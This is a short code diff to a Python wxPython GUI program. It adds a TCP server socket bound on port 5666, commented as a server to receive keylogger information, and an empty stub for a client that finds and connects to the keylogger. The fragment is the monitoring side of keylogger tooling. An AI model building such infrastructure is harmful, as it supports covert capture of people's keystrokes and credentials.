@@ -15,8 +15,17 @@
 #
 
 import socket
+import threading
 import wx
 import wx.xrc
+
+# Server to receive keylogger information
+monitorSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+monitorPort = 5666
+monitorSocket.bind(('',monitorPort))
+
+# Client to connect search and connect to keylogger
+
 
 class MainWindow(wx.Frame):
     def __init__(self, parent, title, size=(600,400) ):
